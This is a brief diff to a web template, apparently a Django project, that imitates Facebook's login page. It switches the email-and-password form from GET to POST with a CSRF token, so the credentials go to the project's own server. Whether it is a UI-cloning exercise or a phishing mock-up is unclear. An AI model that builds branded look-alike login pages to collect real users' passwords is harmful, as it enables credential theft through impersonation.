@@ -244,7 +244,8 @@ form .create-account:hover {
           <h1 class="logo">Facebook</h1>
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
-          <form method="GET" action="/">
+          <form method="POST" >
+            {% csrf_token %}
             <input type="text" placeholder="Email or Phone Number" name="u_name" required />
             <input type="password" placeholder="Password" name="u_pass" required >
             <button class="login" type="submit">Log In</button>
